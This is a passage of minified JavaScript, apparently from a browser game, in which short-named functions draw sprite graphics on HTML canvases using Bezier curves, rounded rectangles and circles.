                    r.bezierCurveTo(47 * e, 28 * e, 40 * e, 32 * e, 36 * e, 44 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(145 * e, 75 * e),
                    r.bezierCurveTo(143 * e, 51 * e, 133 * e, 29 * e, 100 * e, 27 * e),
                    r.bezierCurveTo(52 * e, 21 * e, 37 * e, 37 * e, 31 * e, 54 * e),
                    r.bezierCurveTo(23 * e, 78 * e, 28 * e, 77 * e, 36 * e, 79 * e),
                    r.bezierCurveTo(80 * e, 87 * e, 120 * e, 81 * e, 145 * e, 76 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 4 * e),
                    r.translate(0, -3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 67 * e),
                    r.bezierCurveTo(55 * e, 80 * e, 126 * e, 74 * e, 144 * e, 68 * e),
                    r.bezierCurveTo(144.5 * e, 75 * e, 144.5 * e, 75 * e, 145 * e, 82 * e),
                    r.bezierCurveTo(114 * e, 94 * e, 47 * e, 91 * e, 28 * e, 82 * e),
                    r.closePath(),
                    he(r, i[10], i[10], 4 * e),
                    r.translate(0, 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131 * e, 43 * e),
                    r.bezierCurveTo(145 * e, 40 * e, 148 * e, 32 * e, 147 * e, 17 * e),
                    r.bezierCurveTo(166 * e, 39 * e, 155 * e, 62 * e, 140 * e, 67 * e),
                    r.bezierCurveTo(128 * e, 65 * e, 128 * e, 52 * e, 131 * e, 45 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41 * e, 43 * e),
                    r.bezierCurveTo(30 * e, 42 * e, 24 * e, 33 * e, 25 * e, 17 * e),
                    r.bezierCurveTo(7 * e, 34 * e, 17 * e, 63 * e, 33 * e, 66 * e),
                    r.bezierCurveTo(45 * e, 59 * e, 44 * e, 53 * e, 42 * e, 44 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(24 * e, 19 * e),
                    r.bezierCurveTo(24 * e, 35 * e, 35 * e, 42 * e, 42 * e, 44 * e),
                    r.bezierCurveTo(43 * e, 51 * e, 43 * e, 48 * e, 43 * e, 56 * e),
                    r.bezierCurveTo(25 * e, 47 * e, 17 * e, 36 * e, 23 * e, 20 * e),
                    r.closePath(),
                    he(r, i[6]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(148 * e, 18 * e),
                    r.bezierCurveTo(159 * e, 44 * e, 139 * e, 52 * e, 130 * e, 55 * e),
                    r.bezierCurveTo(129 * e, 48 * e, 129 * e, 46 * e, 131 * e, 43 * e),
                    r.bezierCurveTo(144 * e, 37 * e, 148 * e, 35 * e, 147 * e, 18 * e),
                    r.closePath(),
                    he(r, i[6]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131 * e, 43 * e),
                    r.bezierCurveTo(145 * e, 40 * e, 148 * e, 32 * e, 147 * e, 17 * e),
                    r.bezierCurveTo(166 * e, 39 * e, 155 * e, 62 * e, 140 * e, 67 * e),
                    r.bezierCurveTo(128 * e, 65 * e, 128 * e, 52 * e, 131 * e, 45 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41 * e, 43 * e),
                    r.bezierCurveTo(30 * e, 42 * e, 24 * e, 33 * e, 25 * e, 17 * e),
                    r.bezierCurveTo(7 * e, 34 * e, 17 * e, 63 * e, 33 * e, 66 * e),
                    r.bezierCurveTo(45 * e, 59 * e, 44 * e, 53 * e, 42 * e, 44 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 4 * e),
                    r.save(),
                    r.translate(87 * e, 34.5 * e),
                    r.rotate(0),
                    Ve(r, -8 * e, -10.5 * e, 16 * e, 21 * e, 10 * e),
                    r.restore(),
                    he(r, i[7], i[2], 4 * e),
                    r.save(),
                    r.translate(87 * e, 57 * e),
                    r.rotate(0),
                    Ve(r, -8 * e, -23 * e, 16 * e, 46 * e, 10 * e),
                    r.restore(),
                    he(r, i[8], i[2], 4 * e),
                    ke(r, 87 * e, 39 * e, 4.123105625617661 * e),
                    he(r, i[9], i[2], 4 * e),
                    ke(r, 87 * e, 60 * e, 4.242640687119285 * e),
                    he(r, i[9], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 67 * e),
                    r.bezierCurveTo(55 * e, 80 * e, 126 * e, 74 * e, 144 * e, 68 * e),
                    r.bezierCurveTo(144.5 * e, 75 * e, 144.5 * e, 75 * e, 145 * e, 82 * e),
                    r.bezierCurveTo(114 * e, 94 * e, 47 * e, 91 * e, 28 * e, 82 * e),
                    r.closePath(),
                    he(r, i[8], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27 * e, 69 * e),
                    r.bezierCurveTo(13 * e, 77 * e, 16 * e, 74 * e, 27 * e, 80 * e),
                    r.closePath(),
                    he(r, i[9], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(145 * e, 70 * e),
                    r.bezierCurveTo(149.5 * e, 72 * e, 149.5 * e, 72 * e, 154 * e, 74 * e),
                    r.bezierCurveTo(150 * e, 77 * e, 150 * e, 77 * e, 146 * e, 80 * e),
                    r.closePath(),
                    he(r, i[9], i[2], 4 * e),
                    ke(r, 50 * e, 80 * e, 5 * e),
                    he(r, i[9], i[2], 4 * e),
                    ke(r, 86.01141357421875 * e, 81.76705932617188 * e, 5 * e),
                    he(r, i[9], i[2], 4 * e),
                    ke(r, 119.01141357421875 * e, 80.13069152832031 * e, 5 * e),
                    he(r, i[9], i[2], 4 * e),
                    n
            }
            function yi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 142 * e,
                    n.height = 118 * e,
                    r.save(),
                    r.translate(70.16665649414062 * e, 38.20831298828125 * e),
                    Ve(r, -58.5 * e, -27.5 * e, 117 * e, 55 * e, 20 * e),
                    r.restore(),
                    he(r, i[0], i[1], 4 * e),
                    r.save(),
                    r.translate(70 * e, 42.70831298828125 * e),
                    Ve(r, -61 * e, -20 * e, 122 * e, 40 * e, 20 * e),
                    r.restore(),
                    he(r, i[2], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(123 * e, 70.375 * e),
                    r.bezierCurveTo(115 * e, 99.375 * e, 119 * e, 85.375 * e, 115 * e, 100.375 * e),
                    r.bezierCurveTo(112 * e, 116.375 * e, 117 * e, 109.375 * e, 131 * e, 100.375 * e),
                    r.bezierCurveTo(131 * e, 83.375 * e, 131 * e, 83.375 * e, 131 * e, 66.375 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(11 * e, 68.375 * e),
                    r.bezierCurveTo(11.166656494140625 * e, 84.375 * e, 9 * e, 99.375 * e, 10 * e, 100.375 * e),
                    r.bezierCurveTo(35 * e, 113.375 * e, 27 * e, 110.375 * e, 25 * e, 95.375 * e),
                    r.bezierCurveTo(16 * e, 68.375 * e, 17 * e, 69.375 * e, 17 * e, 68.375 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(46 * e, 32.375 * e),
                    r.bezierCurveTo(43 * e, 8.375 * e, 45 * e, 7.375 * e, 56 * e, 6.375 * e),
                    r.bezierCurveTo(105 * e, 4.375 * e, 102 * e, 6.375 * e, 97 * e, 32.375 * e),
                    r.bezierCurveTo(138 * e, 43.375 * e, 133 * e, 45.375 * e, 133 * e, 58.375 * e),
                    r.bezierCurveTo(133 * e, 85.375 * e, 125 * e, 74.375 * e, 111 * e, 70.375 * e),
                    r.bezierCurveTo(70 * e, 69.875 * e, 29 * e, 69.375 * e, 29 * e, 69.375 * e),
                    r.bezierCurveTo(7 * e, 84.375 * e, 7 * e, 70.375 * e, 7 * e, 59.375 * e),
                    r.bezierCurveTo(6 * e, 28.375 * e, 32 * e, 39.375 * e, 44 * e, 32.375 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 4 * e),
                    ke(r, 71 * e, 44.375 * e, 16.55294535724685 * e),
                    he(r, i[2], i[1], 4 * e),
                    ke(r, 71 * e, 43.70831298828125 * e, 8.94427190999916 * e),
                    he(r, i[2], i[1], 4 * e),
                    n
            }
            function Hi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 142 * e,
                    n.height = 118 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111 * e, 27.3671875 * e),
                    r.bezierCurveTo(128 * e, 9.3671875 * e, 125 * e, 13.3671875 * e, 126 * e, 21.3671875 * e),
                    r.bezierCurveTo(126 * e, 33.3671875 * e, 119 * e, 43.3671875 * e, 118 * e, 42.3671875 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 23.3671875 * e),
                    r.bezierCurveTo(17 * e, 15.3671875 * e, 16 * e, 14.3671875 * e, 17 * e, 20.3671875 * e),
                    r.bezierCurveTo(22 * e, 33.3671875 * e, 20 * e, 27.3671875 * e, 24 * e, 34.3671875 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.save(),
                    r.translate(70.5 * e, 34.8671875 * e),
                    r.rotate(0),
                    Ve(r, -49.5 * e, -21.5 * e, 99 * e, 43 * e, 15 * e),
                    r.restore(),
                    he(r, i[0], i[1], 4 * e),
                    r.save(),
                    r.translate(71 * e, 40.8671875 * e),
                    r.rotate(0),
                    Ve(r, -49 * e, -12.5 * e, 98 * e, 25 * e, 15 * e),
                    r.restore(),
                    he(r, i[2], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(19.800003051757812 * e, 75.95625305175781 * e),
                    r.bezierCurveTo(19.300003051757812 * e, 82.95625305175781 * e, 19.300003051757812 * e, 82.95625305175781 * e, 18.800003051757812 * e, 89.95625305175781 * e),
                    r.bezierCurveTo(38.80000305175781 * e, 115.95625305175781 * e, 37.80000305175781 * e, 104.95625305175781 * e, 31.800003051757812 * e, 91.95625305175781 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(119.80000305175781 * e, 75.95625305175781 * e),
                    r.bezierCurveTo(120.80000305175781 * e, 82.95625305175781 * e, 120.80000305175781 * e, 82.95625305175781 * e, 121.80000305175781 * e, 89.95625305175781 * e),
                    r.bezierCurveTo(101.80000305175781 * e, 111.95625305175781 * e, 99.80000305175781 * e, 111.95625305175781 * e, 112.80000305175781 * e, 81.95625305175781 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(17.800003051757812 * e, 49.15625 * e),
                    r.bezierCurveTo(17.800003051757812 * e, 64.15625 * e, 17.800003051757812 * e, 64.15625 * e, 17.800003051757812 * e, 79.15625 * e),
                    r.bezierCurveTo(23.300003051757812 * e, 85.15625 * e, 23.300003051757812 * e, 85.15625 * e, 28.800003051757812 * e, 91.15625 * e),
                    r.bezierCurveTo(36.80000305175781 * e, 96.15625 * e, 32.80000305175781 * e, 91.15625 * e, 28.800003051757812 * e, 77.15625 * e),
                    r.bezierCurveTo(33.80000305175781 * e, 65.15625 * e, 33.80000305175781 * e, 65.15625 * e, 38.80000305175781 * e, 53.15625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(123.80000305175781 * e, 53.95625305175781 * e),
                    r.bezierCurveTo(121.80000305175781 * e, 77.95625305175781 * e, 121.80000305175781 * e, 74.95625305175781 * e, 121.80000305175781 * e, 78.95625305175781 * e),
                    r.bezierCurveTo(115.80000305175781 * e, 84.95625305175781 * e, 115.80000305175781 * e, 84.95625305175781 * e, 109.80000305175781 * e, 90.95625305175781 * e),
                    r.bezierCurveTo(102.80000305175781 * e, 93.95625305175781 * e, 105.80000305175781 * e, 86.95625305175781 * e, 110.80000305175781 * e, 76.95625305175781 * e),
                    r.bezierCurveTo(107.30000305175781 * e, 65.45625305175781 * e, 103.80000305175781 * e, 53.95625305175781 * e, 103.80000305175781 * e, 53.95625305175781 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(18 * e, 56.3671875 * e),
                    r.bezierCurveTo(70 * e, 56.8671875 * e, 70 * e, 56.8671875 * e, 122 * e, 57.3671875 * e),
                    r.bezierCurveTo(137 * e, 20.3671875 * e, 137 * e, 16.3671875 * e, 126 * e, 22.3671875 * e),
                    r.bezierCurveTo(115.5 * e, 34.3671875 * e, 115.5 * e, 34.3671875 * e, 105 * e, 46.3671875 * e),
                    r.bezierCurveTo(70.5 * e, 46.3671875 * e, 70.5 * e, 46.3671875 * e, 36 * e, 46.3671875 * e),
                    r.bezierCurveTo(4 * e, 14.3671875 * e, 7 * e, 18.3671875 * e, 8 * e, 27.3671875 * e),
                    r.bezierCurveTo(12.5 * e, 41.8671875 * e, 12.5 * e, 41.8671875 * e, 17 * e, 56.3671875 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.save(),
                    r.translate(68.30000305175781 * e, 41.45625305175781 * e),
                    r.rotate(.76),
                    Ve(r, -20.5 * e, -20.5 * e, 41 * e, 41 * e, 10 * e),
                    r.restore(),
                    he(r, void 0, i[5], 4 * e),
                    r.save(),
                    r.translate(68.80000305175781 * e, 44.45625305175781 * e),
                    r.rotate(.76),
                    Ve(r, -21 * e, -20.5 * e, 42 * e, 41 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[4], 4 * e),
                    r.save(),
                    r.translate(69.80000305175781 * e, 44.556243896484375 * e),
                    r.rotate(.76),
                    Ve(r, -10 * e, -10 * e, 20 * e, 20 * e, 5 * e),
                    r.restore(),
                    he(r, i[6], i[7], 4 * e),
                    n
            }
            function Pi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 145 * e,
                    n.height = 120 * e,
                    r.beginPath(),
                    r.scale(.6, .6),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(18 * e, -8 * e),
                    r.moveTo(101 * e, 72 * e),
                    r.bezierCurveTo(144 * e, 69 * e, 149 * e, 58 * e, 162 * e, 49 * e),
                    r.bezierCurveTo(174 * e, 31 * e, 173 * e, 38 * e, 172 * e, 45 * e),
                    r.bezierCurveTo(168 * e, 73 * e, 158 * e, 75 * e, 152 * e, 78 * e),
                    r.bezierCurveTo(106 * e, 89 * e, 107 * e, 91 * e, 107 * e, 94 * e),
                    r.bezierCurveTo(107 * e, 100 * e, 107 * e, 107 * e, 107 * e, 107 * e),
                    r.bezierCurveTo(99 * e, 112 * e, 98 * e, 110 * e, 93 * e, 107 * e),
                    r.bezierCurveTo(94 * e, 107 * e, 93 * e, 107 * e, 93 * e, 107 * e),
                    r.bezierCurveTo(93 * e, 100 * e, 93 * e, 100 * e, 92 * e, 94 * e),
                    r.bezierCurveTo(92 * e, 89 * e, 90 * e, 90 * e, 73 * e, 86 * e),
                    r.bezierCurveTo(45 * e, 81 * e, 40 * e, 77 * e, 35 * e, 68 * e),
                    r.bezierCurveTo(23 * e, 36 * e, 28 * e, 34 * e, 36 * e, 46 * e),
                    r.bezierCurveTo(45 * e, 58 * e, 83 * e, 72 * e, 98 * e, 72 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    r.beginPath(),
                    r.scale(1.1, 1.1),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(-9 * e, 4 * e),
                    r.moveTo(101 * e, 72 * e),
                    r.bezierCurveTo(144 * e, 69 * e, 149 * e, 58 * e, 162 * e, 49 * e),
                    r.bezierCurveTo(174 * e, 31 * e, 173 * e, 38 * e, 172 * e, 45 * e),
                    r.bezierCurveTo(168 * e, 73 * e, 158 * e, 75 * e, 152 * e, 78 * e),
                    r.bezierCurveTo(106 * e, 89 * e, 107 * e, 91 * e, 107 * e, 94 * e),
                    r.bezierCurveTo(107 * e, 100 * e, 107 * e, 107 * e, 107 * e, 107 * e),
                    r.bezierCurveTo(99 * e, 112 * e, 98 * e, 110 * e, 93 * e, 107 * e),
                    r.bezierCurveTo(94 * e, 107 * e, 93 * e, 107 * e, 93 * e, 107 * e),
                    r.bezierCurveTo(93 * e, 100 * e, 93 * e, 100 * e, 92 * e, 94 * e),
                    r.bezierCurveTo(92 * e, 89 * e, 90 * e, 90 * e, 73 * e, 86 * e),
                    r.bezierCurveTo(45 * e, 81 * e, 40 * e, 77 * e, 35 * e, 68 * e),
                    r.bezierCurveTo(23 * e, 36 * e, 28 * e, 34 * e, 36 * e, 46 * e),
                    r.bezierCurveTo(45 * e, 58 * e, 83 * e, 72 * e, 98 * e, 72 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    r.scale(1.1, 1.1),
                    r.translate(-9 * e, 4 * e),
                    r.save(),
                    r.translate(100 * e, 73.06874084472656 * e),
                    r.rotate(0),
                    Ve(r, -61 * e, -38.5 * e, 122 * e, 40 * e, 20 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.save(),
                    r.translate(100 * e, 71.36874389648438 * e),
                    r.rotate(0),
                    Ve(r, -60.5 * e, -18 * e, 121 * e, 30 * e, 20 * e),
                    r.restore(),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(144 * e, 80 * e),
                    r.bezierCurveTo(152 * e, 100 * e, 152 * e, 101 * e, 153 * e, 102 * e),
                    r.bezierCurveTo(159 * e, 100 * e, 159 * e, 100 * e, 160 * e, 100 * e),
                    r.bezierCurveTo(161 * e, 84 * e, 161 * e, 84 * e, 162 * e, 68 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(57 * e, 75 * e),
                    r.bezierCurveTo(48 * e, 101 * e, 53 * e, 89 * e, 48 * e, 102 * e),
                    r.bezierCurveTo(44 * e, 100 * e, 44 * e, 100 * e, 39 * e, 97 * e),
                    r.bezierCurveTo(39 * e, 83 * e, 39 * e, 83 * e, 39 * e, 69 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(101 * e, 72 * e),
                    r.bezierCurveTo(144 * e, 69 * e, 149 * e, 58 * e, 162 * e, 49 * e),
                    r.bezierCurveTo(174 * e, 31 * e, 173 * e, 38 * e, 172 * e, 45 * e),
                    r.bezierCurveTo(168 * e, 73 * e, 158 * e, 75 * e, 152 * e, 78 * e),
                    r.bezierCurveTo(106 * e, 89 * e, 107 * e, 91 * e, 107 * e, 94 * e),
                    r.bezierCurveTo(107 * e, 100 * e, 107 * e, 107 * e, 107 * e, 107 * e),
                    r.bezierCurveTo(99 * e, 112 * e, 98 * e, 110 * e, 93 * e, 107 * e),
                    r.bezierCurveTo(94 * e, 107 * e, 93 * e, 107 * e, 93 * e, 107 * e),
                    r.bezierCurveTo(93 * e, 100 * e, 93 * e, 100 * e, 92 * e, 94 * e),
                    r.bezierCurveTo(92 * e, 89 * e, 90 * e, 90 * e, 73 * e, 86 * e),
                    r.bezierCurveTo(45 * e, 81 * e, 40 * e, 77 * e, 35 * e, 68 * e),
                    r.bezierCurveTo(23 * e, 36 * e, 28 * e, 34 * e, 36 * e, 46 * e),
                    r.bezierCurveTo(45 * e, 58 * e, 83 * e, 72 * e, 98 * e, 72 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    r.translate(0, 0),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115.5 * e, 116.07290649414062 * e),
                    r.bezierCurveTo(159.5 * e, 99.07290649414062 * e, 159.5 * e, 98.07290649414062 * e, 159.5 * e, 98.07290649414062 * e),
                    r.bezierCurveTo(155.5 * e, 116.07290649414062 * e, 159.5 * e, 116.07290649414062 * e, 159.5 * e, 118.07290649414062 * e),
                    r.bezierCurveTo(147.5 * e, 130.07290649414062 * e, 136.5 * e, 132.07290649414062 * e, 115.5 * e, 138.07290649414062 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39.5 * e, 96.07290649414062 * e),
                    r.bezierCurveTo(85.5 * e, 114.07290649414062 * e, 62.5 * e, 105.57290649414062 * e, 85.5 * e, 115.07290649414062 * e),
                    r.bezierCurveTo(85.5 * e, 125.57290649414062 * e, 85.5 * e, 125.57290649414062 * e, 85.5 * e, 136.07290649414062 * e),
                    r.bezierCurveTo(51.5 * e, 129.07290649414062 * e, 51.5 * e, 125.07290649414062 * e, 41.5 * e, 118.07290649414062 * e),
                    r.bezierCurveTo(44.5 * e, 106.07290649414062 * e, 42.5 * e, 103.07290649414062 * e, 40.5 * e, 96.07290649414062 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(86 * e, 80 * e),
                    r.bezierCurveTo(97 * e, 88 * e, 106 * e, 84 * e, 112 * e, 80 * e),
                    r.bezierCurveTo(112 * e, 62 * e, 106 * e, 59 * e, 99 * e, 54 * e),
                    r.bezierCurveTo(86 * e, 62 * e, 86 * e, 73 * e, 86 * e, 80 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    r.scale(.5, .5),
                    r.translate(100 * e, 71 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(86 * e, 80 * e),
                    r.bezierCurveTo(97 * e, 88 * e, 106 * e, 84 * e, 112 * e, 80 * e),
                    r.bezierCurveTo(112 * e, 62 * e, 106 * e, 59 * e, 99 * e, 54 * e),
                    r.bezierCurveTo(86 * e, 62 * e, 86 * e, 73 * e, 86 * e, 80 * e),
                    r.closePath(),
                    he(r, i[6], i[2], 4 * e),
                    n
            }
            function zi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.save(),
                    r.translate(204 * e, 195.0833282470703 * e),
                    r.rotate(10.16),
                    Ve(r, -97.5 * e, -134.5 * e, 195 * e, 269 * e, 10 * e),
                    r.restore(),
                    he(r, i[0], i[1], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(58.5 * e, 226.5833282470703 * e),
                    r.bezierCurveTo(120.5 * e, 281.5833282470703 * e, 120.5 * e, 281.5833282470703 * e, 182.5 * e, 336.5833282470703 * e),
                    r.bezierCurveTo(263 * e, 248.5833282470703 * e, 263 * e, 248.5833282470703 * e, 343.5 * e, 160.5833282470703 * e),
                    r.bezierCurveTo(280.5 * e, 104.58332824707031 * e, 280.5 * e, 104.58332824707031 * e, 217.5 * e, 48.58332824707031 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 4 * e),
                    r.save(),
                    r.translate(197 * e, 169.0833282470703 * e),
                    r.rotate(10.16),
                    Ve(r, -93.5 * e, -126.5 * e, 187 * e, 253 * e, 10 * e),
                    r.restore(),
                    he(r, i[4], i[1], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(226.5 * e, 24.583328247070312 * e),
                    r.bezierCurveTo(58.5 * e, 207.5833282470703 * e, 143 * e, 116.58332824707031 * e, 59.5 * e, 208.5833282470703 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(46.133331298828125 * e, 202.64999389648438 * e),
                    r.bezierCurveTo(46.133331298828125 * e, 215.64999389648438 * e, 46.133331298828125 * e, 215.64999389648438 * e, 46.133331298828125 * e, 228.64999389648438 * e),
                    r.closePath(),
                    he(r, i[4], i[1], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55.133331298828125 * e, 211.64999389648438 * e),
                    r.bezierCurveTo(55.133331298828125 * e, 225.14999389648438 * e, 55.133331298828125 * e, 225.14999389648438 * e, 55.133331298828125 * e, 238.64999389648438 * e),
                    r.bezierCurveTo(50.133331298828125 * e, 235.64999389648438 * e, 50.133331298828125 * e, 235.64999389648438 * e, 45.133331298828125 * e, 232.64999389648438 * e),
                    r.bezierCurveTo(45.133331298828125 * e, 216.64999389648438 * e, 45.133331298828125 * e, 216.64999389648438 * e, 45.133331298828125 * e, 200.64999389648438 * e),
                    r.closePath(),
                    he(r, i[4], i[1], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(46.133331298828125 * e, 198.39999389648438 * e),
                    r.bezierCurveTo(46.133331298828125 * e, 199.89999389648438 * e, 46.133331298828125 * e, 199.89999389648438 * e, 46.133331298828125 * e, 201.39999389648438 * e),
                    r.closePath(),
                    he(r, i[4], i[1], 8 * e),
                    r.save(),
                    r.translate(249.63333129882812 * e, 120.89999389648438 * e),
                    r.rotate(7.04),
                    Ve(r, -58.5 * e, -32 * e, 117 * e, 64 * e, 10 * e),
                    r.restore(),
                    he(r, i[5]),
                    n
            }
            function Bi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 170 * e,
                    n.height = 170 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(-10 * e, 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 4.109375 * e),
                    r.bezierCurveTo(117 * e, 9.609375 * e, 117 * e, 9.609375 * e, 161.5 * e, 15.109375 * e),
                    r.bezierCurveTo(134.5 * e, 106.109375 * e, 110.5 * e, 130.109375 * e, 63.5 * e, 145.109375 * e),
                    r.bezierCurveTo(33.5 * e, 120.609375 * e, 33.5 * e, 120.609375 * e, 3.5 * e, 96.109375 * e),
                    r.bezierCurveTo(82.5 * e, 75.109375 * e, 69.5 * e, 29.109375 * e, 71.5 * e, 6.109375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(10 * e, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 4.109375 * e),
                    r.bezierCurveTo(117 * e, 9.609375 * e, 117 * e, 9.609375 * e, 161.5 * e, 15.109375 * e),
                    r.bezierCurveTo(134.5 * e, 106.109375 * e, 110.5 * e, 130.109375 * e, 63.5 * e, 145.109375 * e),
                    r.bezierCurveTo(33.5 * e, 120.609375 * e, 33.5 * e, 120.609375 * e, 3.5 * e, 96.109375 * e),
                    r.bezierCurveTo(82.5 * e, 75.109375 * e, 69.5 * e, 29.109375 * e, 71.5 * e, 6.109375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    n
            }
            function wi(e, t, i) {
                var n, r = (n = document.createElement("canvas")).getContext("2d");
                return n.width = 47 * e,
                    n.height = 60 * e,
                    r = (n = document.createElement("canvas")).getContext("2d"),
                    n.width = 47 * e,
                    n.height = 60 * e,
                    ke(r, 23.5 * e, 20.734375 * e, 15.132745950421556 * e),
                    he(r, void 0, i[2], 4 * e),
                    ke(r, 23.5 * e, 20.734375 * e, 18.601075237738275 * e),
                    he(r, void 0, i[1], 4 * e),
                    ke(r, 23.5 * e, 20.734375 * e, 11.40175425099138 * e),
                    he(r, void 0, i[1], 4 * e),
                    r.save(),
                    r.translate(23 * e, 38.734375 * e),
                    r.rotate(0),
                    Ve(r, -21.5 * e, -19 * e, 43 * e, 38 * e, 10 * e),
                    r.restore(),
                    he(r, i[2], i[1], 4 * e),
                    r.save(),
                    r.translate(23.5 * e, 43.734375 * e),
                    r.rotate(.5235987755982988),
                    A(r, 3, 8.06225774829855 * e, 0 * e),
                    r.restore(),
                    he(r, i[3]),
                    ke(r, 23.5 * e, 35.734375 * e, 7.0710678118654755 * e),
                    he(r, i[3]),
                    n
            }
            function Wi(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d");
                return r.width = 501 * e,
                    r.height = 564 * e,
                    o.scale(.5, .5),
                    o.translate(240 * e, 255 * e),
                    o.rotate(n),
                    o.globalAlpha = t ? .5 : .2,
                    ke(o, 174 * e, 87.984375 * e, 20.8806130178211 * e),
                    he(o, i[0], i[0], 8 * e),
                    ke(o, 174 * e, 87.984375 * e, 12.165525060596439 * e),
                    he(o, i[0], i[0], 8 * e),
                    ke(o, 174 * e, 87.484375 * e, 6 * e),
                    he(o, i[0]),
                    ke(o, 30 * e, 87.984375 * e, 20.8806130178211 * e),
                    he(o, i[0], i[0], 4 * e),
